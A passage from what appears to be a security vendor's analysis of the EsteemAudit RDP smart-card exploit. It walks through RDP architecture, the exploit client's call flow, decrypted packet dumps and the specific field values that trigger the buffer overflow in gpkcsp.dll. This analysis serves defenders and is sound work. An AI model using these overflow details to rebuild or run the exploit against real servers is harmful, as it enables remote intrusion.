<p>The full details of how the Remote Desktop Protocol operates are out of scope for this blog, but in this section we’ll describe the components which are relevant to this exploit.</p>
<h3>Architecture and Components</h3>
<p>The <a href="https://technet.microsoft.com/en-us/library/cc755399(v=ws.10).aspx">Terminal Services Architecture</a> has four parts: multi-user kernel, the Remote Desktop client, the Terminal Services Licensing service, and Session Directory Services.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_1.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32200" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_1.png" alt="esteemaudit_1" width="865" height="584" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_1.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_1-300x203.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_1-768x519.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_1-370x250.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 1 Terminal Services Architecture Diagram – <a href="https://technet.microsoft.com/en-us/library/cc755399(v=ws.10).aspx">(Used with permission from Microsoft)</a></em></p>
<p style="margin: 0in; margin-bottom: .0001pt; line-height: 13.5pt;"><span style="font-size: 10.0pt; font-family: 'Segoe UI','sans-serif'; color: #2a2a2a;">The following table describes the Terminal Services architecture components.</span></p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_2.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32176" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_2.png" alt="esteemaudit_2" width="865" height="533" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_2.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_2-300x185.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_2-768x473.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_2-370x228.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure </em><em>2</em><em> Terminal Services Architecture Components – From </em><a href="https://technet.microsoft.com/en-us/library/cc755399(v=ws.10).aspx">Microsoft</a></p>
<p>Nicolas Collignon describes the relationships between these components in his paper named <a href="http://www.hsc.fr/ressources/presentations/ossir_rdp/rdp2tcp.pdf">Tunneling TCP over RDP</a>.</p>
<p>In the kernel-land, the relevant component is rdpwd.sys, which is responsible for MCS (Multipoint Communication Service) stack. The RDP PDU (Protocol Data Unit) are parsed and decrypted in this component.</p>
<p>In user-land, the winlogon component is most relevant. It is responsible for authentication of remote client. For example, if the client request a smart card redirection, the winlogon.exe will launch smart card component and communicate with the client.</p>
<h3>RDP Protocol</h3>
<p>With the architecture and components of remote desktop service introduced, we can dive into the components of the Remote Desktop Protocol that are relevant to the vulnerability exploited by EsteemAudit. There are several RDP documents in <a href="https://msdn.microsoft.com/en-us/library/jj712081.aspx">MSDN documentation page</a> which are relevant to this analysis. Some of them describe the basic protocol like, <a href="https://msdn.microsoft.com/en-us/library/cc240445.aspx">[MS-RDPBCGR]: Remote Desktop Protocol: Basic Connectivity and Graphics Remoting</a>. Others describe extensions for RDP, like <a href="https://msdn.microsoft.com/en-us/library/cc242596.aspx">[MS-RDPESC]: Remote Desktop Protocol: Smart Card Virtual Channel Extension.</a> Aurélien Bordes listed all of the extensions at a talk at the OSSIR conference in 2010.</p>
<p>For the purposes of this analysis, we will consider the following components:</p>
<ul>
<li><a href="https://msdn.microsoft.com/en-us/library/cc240445.aspx">[MS-RDPBCGR] &#8211; Remote Desktop Protocol: Basic Connectivity and Graphics Remoting</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/cc242596.aspx">[MS-RDPESC] &#8211; Remote Desktop Protocol: Smart Card Virtual Channel Extension</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/cc241305.aspx">[MS-RDPEFS] &#8211; Remote Desktop Protocol: File System Virtual Channel Extension</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/cc243560.aspx">[MS-RPCE] &#8211; Remote Procedure Call Protocol Extensions.</a></li>
</ul>
<p>MS-RDPBCGR is based on the ITU (International Telecommunication Union) <a href="https://www.itu.int/rec/T-REC-T.120-200701-I/en">T.120 series</a> of protocols. The T.120 standard is composed of multiple other standards, and uses the <a href="https://www.itu.int/rec/T-REC-X.224/en">X.224</a> standard for transport layer communications. The X.224 standard specified how RDP packets should be encrypted and we can see this in “request PDU” and “confirm PDU” requests.</p>
<p>The encryptionMethods flag in X.224 request in the example below is set to 0x00000012, which represents the client requesting the 128-bit RC4 encryption [128BIT_ENCRYPTION_FLAG 0x00000002] or FIPS[FIPS_ENCRYPTION_FLAG 0x00000010].</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_3.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32152" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_3.png" alt="esteemaudit_3" width="865" height="996" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_3.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_3-261x300.png 261w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_3-768x884.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_3-370x426.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 3 X.224 Request PDU Specifying Encryption Methods</em></p>
<p>The server responds by confirming the encryptionMethod is 0x00000002 (128-bit RC4) in an X.224 confirm PDU message.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_4.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32128" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_4.png" alt="esteemaudit_4" width="865" height="735" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_4.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_4-300x255.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_4-768x653.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_4-370x314.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 4 X.224 Confirm PDU message Confirming Encryption Method (128-bit RC4)</em></p>
<p>To keep this blog from going outside the scope of the vulnerability we will not explain the remaining steps in the protocol connection process, but the details are available in <a href="https://msdn.microsoft.com/en-us/library/cc240445.aspx">in [MS-RDPBCGR] &#8211; Remote Desktop Protocol: Basic Connectivity and Graphics Remoting.</a></p>
<p>After the RDP connection is created, the PDU between client and server will be encrypted with the negotiated encryption method (for example: 128-bit RC4). Below is an example of Client Info PDU.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_5.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32104" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_5.png" alt="esteemaudit_5" width="865" height="1003" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_5.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_5-259x300.png 259w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_5-768x891.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_5-370x429.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 5 RDP Client Info PDU</em></p>
<p>The data included in this PDU is parsed out into the following components:</p>
<table style="height: 404px;" width="582">
<tbody>
<tr>
<td width="415">64 00 04 03 eb 70 81 56 -&gt; PER encoded (ALIGNED variant of BASIC-PER) SendDataRequest</p>
<p>initiator = 1005 (0x03ed)</p>
<p>channelId = 1003 (0x03eb)</p>
<p>dataPriority = high</p>
<p>segmentation = begin | end</p>
<p>userData length = 0x156 = 342 bytes</p>
<p>&nbsp;</p>
<p>48 00 -&gt; TS_SECURITY_HEADER::flags = 0x0048 0x0048 (SEC_INFO_PKT | SEC_ENCRYPT</p>
<p>&nbsp;</p>
<p>00 00 -&gt; TS_SECURITY_HEADER::flagsHi &#8211; ignored as flags field does not contain SEC_FLAGSHI_VALID (0x8000)</p>
<p>6f 6d 0c d5 b7 0c 5d 7e -&gt; TS_SECURITY_HEADER1::dataSignature</td>
</tr>
</tbody>
</table>
<p>The remaining data from the offset 0x51 to the end which begins with 86 b8 8a a9 is Encrypted TS_INFO_PACKET.</p>
<table style="height: 819px;" width="635">
<tbody>
<tr>
<td width="415">len</p>
<p>0178d254  0000014a                             J&#8230;</p>
<p>&nbsp;</p>
<p>encrypted</p>
<p>038e3c8b  a98ab886 dabad90d d9d8f9e3 8dd5bafa  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038e3c9b  1407ea51 883cb6af 21ca2bdb cab1e030  Q&#8230;..&lt;..+.!0&#8230;</p>
<p>038e3cab  d6aaeccd 1c599171 1be8c40d 96d651dc  &#8230;.q.Y&#8230;&#8230;Q..</p>
<p>038e3cbb  2d018a22 242aac0d 7b58948f 4be28b23  &#8220;..-..*$..X{#..K</p>
<p>038e3ccb  36cf54c6 52b70939 4064362b 9e37e989  .T.69..R+6d@..7.</p>
<p>038e3cdb  9ff09b06 4f862c80 1546198a ac9b03ed  &#8230;..,.O..F&#8230;..</p>
<p>038e3ceb  420acbdf 566591c1 7f471159 0e1d6906  &#8230;B..eVY.G..i..</p>
<p>038e3cfb  906474f4 476ea91e 4db2edd2 fb464bfd  .td&#8230;nG&#8230;M.KF.</p>
<p>&nbsp;</p>
<p>plain</p>
<p>038e3c8b  00000000 00000133 001a0000 00000000  &#8230;.3&#8230;&#8230;&#8230;..</p>
<p>038e3c9b  00000000 00640061 0069006d 0069006e  &#8230;.a.d.m.i.n.i.</p>
<p>038e3cab  00740073 00610072 006f0074 00000072  s.t.r.a.t.o.r&#8230;</p>
<p>038e3cbb  00000000 00020000 0031001c 00320039  &#8230;&#8230;&#8230;.1.9.2.</p>
<p>038e3ccb  0031002e 00380036 0032002e 00320034  ..1.6.8&#8230;2.4.2.</p>
<p>038e3cdb  0031002e 003c0000 003a0043 0057005c  ..1&#8230;&lt;.C.:.\.W.</p>
<p>038e3ceb  004e0049 0054004e 0053005c 00730079  I.N.N.T.\.S.y.s.</p>
<p>038e3cfb  00650074 0033006d 005c0032 0073006d  t.e.m.3.2.\.m.s.</td>
</tr>
</tbody>
</table>
<p>We can parse the protocol details from plain TS_INFO_PACKET according the format described in [MS-RDPBCGR].</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_6.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32080" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_6.png" alt="esteemaudit_6" width="865" height="685" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_6.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_6-300x238.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_6-768x608.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_6-370x293.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 6 Info Packet Structure from MS-RDPBCGR</em></p>
<h3>Smart Card Extension</h3>
<p>RDP has an extension which supports remote client login using a smart card. From [MS-RDPESC], we can find the protocol sequence and details of protocol flow.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_8.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32032" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_8.png" alt="esteemaudit_8" width="660" height="518" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_8.png 660w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_8-300x235.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_8-370x290.png 370w" sizes="(max-width: 660px) 100vw, 660px" /></a></p>
<p><em>Figure 7 High Level Protocol Sequence Diagram from MS-RDPESC</em></p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_9.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-32008" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_9.png" alt="esteemaudit_9" width="865" height="569" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_9.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_9-300x197.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_9-768x505.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_9-370x243.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 8 Protocol Flow Diagram from MS-RDPESC</em></p>
<p>EsteemAudit uses the type of SCARD_IOCTL_TRANSMIT to communicate with the smart card module on the server.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_10.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31984" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_10.png" alt="esteemaudit_10" width="865" height="207" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_10.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_10-300x72.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_10-768x184.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_10-370x89.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 9 SCARD_IOCTL_TRANSMIT description from MS-RDPESC</em></p>
<p>As the specification states, the packet returned to a client by the server has a type of Transmit_Return. The specification describes the various fields this packet includes.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_11.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31960" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_11.png" alt="esteemaudit_11" width="865" height="449" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_11.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_11-300x156.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_11-768x399.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_11-370x192.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 10: Transmit_Return description from MS-RDPESC</em></p>
<p>The packet sent from server to server has a type of Transmit_Call.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_12.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31936" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_12.png" alt="esteemaudit_12" width="865" height="730" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_12.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_12-300x253.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_12-768x648.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_12-370x312.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 11 Transmit_Call description from MS-RDPESC</em></p>
<h3>RDP Exploit Client (EsteemAudit.exe)</h3>
<p>After understanding the basic knowledge of architecture, components, protocol and communications of RDP, we can look specifically at what the EsteemAudit.exe exploit client does. EsteemAudit.exe is responsible for communicating with the RDP server just like an RDP Client according the RDP protocol. It emulates an RDP client using a smart card, and sends a smart card redirection authentication request to RDP server to force it to handle the data and structure sent by EsteemAudit using the smart card module gpkcsp.dll where the vulnerability exists.</p>
<h3>EsteemAudit.exe Overview</h3>
<p>After reverse engineering the EsteemAudit binary, we found the exploit-start function named GoRunExp at the address .text:00381009. We will not show the entire function for brevity, and only introduce the main execution flow here.</p>
<table style="height: 860px;" width="819">
<tbody>
<tr>
<td width="415">GoRunExp</p>
<p>à InitializeInputParameters //get the config information</p>
<p>à connect2Target</p>
<p>ààinitRDPLib</p>
<p>ààemulateSmartCard</p>
<p>ààconnect2RDP</p>
<p>ààregisterCallback(CallBackFunction)</p>
<p>à RecvProcessSendPackets</p>
<p>à RdpLib_SendKeyStrokes // Sending Space Bar</p>
<p>à RecvProcessSendPackets</p>
<p>à buildExpBuffer</p>
<p>ààbuild_all_x86</p>
<p>àààbuild_overflow_x86</p>
<p>àààbuild_exploit_x86</p>
<p>àààbuild_egg0_x86</p>
<p>ààà//set auth code, xor mask, open payload dll, etc</p>
<p>ààà build_egg1_payloadxxx</p>
<p>à RdpLib_SendKeyStrokes // Sending Enter key</p>
<p>à RecvProcessSendPackets</p>
<p>…</p>
<p>à RecvProcessSendPackets</p>
<p>àà//send smart card authentication redirection request, receive and process the according response, communicate with the server, in the last phase send the ExpBuffer(including overflow buffer, exploit and egg0 buffer) to the server to control the EIP, at last send the end response to server to end the first stage.</p>
<p>àà//to be mentioned, CallBackFunction registered in connect2Target will be called to process the response and prints logs like “SELECT_FILE &#8211; GPK Card MF”, “GET_RESPONSE &#8211; data unit size”, “GET_RESPONSE &#8211; serial number”.</p>
<p>…</td>
</tr>
</tbody>
</table>
<p>We found that after the preparation work including connect2Target and building the exploit buffer, RecvProcessSendPackets is called repeatedly to receive and process the data from the server and send the buffer previously prepared back to it. RecvProcessSendPackets is responsible for all the details of communicating with smart card modules on the RDP server, which we discuss in an upcoming section. However, we will not introduce the details of this function, but focus on what packets RecvProcessSendPackets sends to exploit the vulnerability.</p>
<h3>Overflow Packet</h3>
<p>When building the overflow packet, there are only two effective fields: a value at the 0x8d offset and a constant 0x9000 at the 0x91 offset, all other fields are random data.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_13.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31912" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_13.png" alt="esteemaudit_13" width="838" height="483" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_13.png 838w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_13-300x173.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_13-768x443.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_13-370x213.png 370w" sizes="(max-width: 838px) 100vw, 838px" /></a></p>
<p><em>Figure 12 build_overflow_x86 function assembling the exploit packet.</em></p>
<p>To see the complete data sent by client, we can inspect one of the overflow packets.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_14.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31888" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_14.png" alt="esteemaudit_14" width="865" height="865" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_14.png 865w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_14-150x150.png 150w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_14-300x300.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_14-768x768.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_14-370x370.png 370w" sizes="(max-width: 865px) 100vw, 865px" /></a></p>
<p><em>Figure 13 Overflow Packet dissected in Wireshark</em></p>
<p>As described below, after the offset 0x51, the data named TS_INFO_DATA is encrypted. To decrypt the TS_INFO_DATA, we noticed that all of data are encrypted by client with the Libeay32!RC4 function.</p>
<p>We can get the prototype of the RC4 function &#8212; RC4(key, len, in, out) by simply debugging it.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_15.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-31864" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_15.png" alt="esteemaudit_15" width="514" height="443" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_15.png 514w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_15-300x259.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/05/EsteemAudit_15-370x319.png 370w" sizes="(max-width: 514px) 100vw, 514px" /></a></p>
<p><em>Figure 14 Libeay32!RC4 disassembly.</em></p>
<p>We can then set a breakpoint before and after the RC4 function execution to print the in and out buffers retrieve the encrypted data and decrypted data.</p>
<table style="height: 96px;" width="639">
<tbody>
<tr>
<td width="415">bu image00380000+0xab24 &#8220;.echo len;dc esp+10 L1;.echo rc4_in_buffer;dc poi(esp+8);gc&#8221;</p>
<p>bu image00380000+0xab39 &#8220;.echo rc4_out_buffer;dc poi(esp+0c);gc&#8221;</td>
</tr>
</tbody>
</table>
<p>The decrypted buffer gives us the content of the TS_INFO_DATA of the overflow packet.</p>
<table style="height: 1568px;" width="609">
<tbody>
<tr>
<td width="415">len</p>
<p>0178cf98  000000fc                             &#8230;.</p>
<p>&nbsp;</p>
<p>encrypted</p>
<p>038e8d6b  0649efba dcb9b66b f63f676c a2ddcc3b  ..I.k&#8230;lg?.;&#8230;</p>
<p>038e8d7b  56e1fb2e c9ed4e9c bf566979 4d9e3868  &#8230;V.N..yiV.h8.M</p>
<p>038e8d8b  5dffb177 af4531e2 cd87df84 18a3afff  w..].1E&#8230;&#8230;&#8230;</p>
<p>038e8d9b  56c96e10 7dd116d9 f1db47e2 b65bba04  .n.V&#8230;}.G&#8230;.[.</p>
<p>038e8dab  5d8892ca 324864cb 70bc4793 82be0c5b  &#8230;].dH2.G.p[&#8230;</p>
<p>038e8dbb  d5737937 512ce129 21738638 ca18a61a  7ys.).,Q8.s!&#8230;.</p>
<p>038e8dcb  58a5f061 fe8af8db f6c40f83 a975c925  a..X&#8230;&#8230;..%.u.</p>
<p>038e8ddb  7da42561 8e0a740f b10381b2 ef4f3c00  a%.}.t&#8230;&#8230;.&lt;O.</p>
<p>…</p>
<p>decrypted</p>
<p>038e8d6b  000000f4 00000003 49434472 00000000  &#8230;&#8230;..rDCI&#8230;.</p>
<p>038e8d7b  00000001 00000000 000000e0 00081001  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038e8d8b  cccccccc 000000c0 00000000 00000000  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038e8d9b  00000000 000000b2 00000001 000000b2  &#8230;&#8230;&#8230;&#8230;&#8230;.</p>
<p>038e8dab  fce3940b f2c3bad3 7134f185 b595ac48  &#8230;&#8230;&#8230;.4qH&#8230;</p>
<p>038e8dbb  2d8186ec 56e66ee1 ca0e854f e618d890  &#8230;-.n.VO&#8230;&#8230;.</p>
<p>038e8dcb  fcf78fcf 6972d722 8a3307d7 e1715046  &#8230;.&#8221;.ri..3.FPq.</p>
<p>038e8ddb  6d3184f2 7eb82735 0c1d6f4b e6a262fe  ..1m5&#8242;.~Ko&#8230;b..</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>Protocol details [references: [MS-RDPESC].pdf, [MS-RDPEFS].pdf, [MS-RPCE].pdf]</p>
<p>000000f4 -&gt;CodePage</p>
<p>00000003 -&gt;Flags</p>
<p>Device Control Response (DR_CONTROL_RSP)</p>
<p>-&gt;DeviceIoReply (16 bytes): DR_DEVICE_IOCOMPLETION</p>
<p>4472 -&gt;RDPDR_CTYP_CORE 0x4472</p>
<p>4943 -&gt;PAKID_CORE_DEVICE_IOCOMPLETION 0x4943</p>
<p>00000000 -&gt;DeviceId (4 bytes)</p>
<p>00000001 -&gt;CompletionId (4 bytes)</p>
<p>00000000 -&gt;IoStatus (4 bytes)</p>
<p>000000e0 -&gt;OutputBufferLength (4 bytes)</p>
<p>-&gt;OutputBuffer (variable)</p>
<p>00081001 cccccccc Type Serialization Version 1 header</p>
<p>000000c0 -&gt;ObjectBufferLength (4 bytes)</p>
<p>00000000 -&gt;Filler (4 bytes)</p>
<p>00000000 -&gt;ReturnCode</p>
<p>00000000 -&gt;dwProtocol</p>
<p>000000b2 -&gt;cbRecvLength</p>
<p>-&gt;pbExtraBytes</p>
<p>00000001 000000b2</p>
<p>fce3940b f2c3bad3 7134f185 b595ac48</p>
<p>2d8186ec 56e66ee1 ca0e854f e618d890</p>
<p>fcf78fcf 6972d722 8a3307d7 e1715046</p>
<p>6d3184f2 7eb82735 0c1d6f4b e6a262fe</p>
<p>&nbsp;</td>
</tr>
</tbody>
</table>
<p>As the execution continues, we can extract the two fields from the memory dump which will trigger the buffer overflow.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287a9a8e2822558283" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
WINDBG&amp;gt;dc 04fdd650+8d
04fdd6dd  080190dc 00009000 d7d93015 9dd1e4b1  .........0......</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287a9a8e2822558283-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287a9a8e2822558283-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287a9a8e2822558283-1"><span class="crayon-v">WINDBG</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-i">dc</span><span class="crayon-h"> </span><span class="crayon-cn">04fdd650</span><span class="crayon-o">+</span><span class="crayon-cn">8d</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287a9a8e2822558283-2"><span class="crayon-cn">04fdd6dd</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">080190dc</span><span class="crayon-h"> </span><span class="crayon-cn">00009000</span><span class="crayon-h"> </span><span class="crayon-i">d7d93015</span><span class="crayon-h"> </span><span class="crayon-cn">9dd1e4b1</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-cn">0......</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The address 0x080190dc is important to note, we will introduce how it is involved in the exploit in the RDP Server section below.</p>
<h3>Exploit Packet Analysis</h3>
<p>When building the exploit buffer, there are many interesting fields used in the buffer, like 0x11111111, 0x22222222 and 0x7ffe0300.</p>
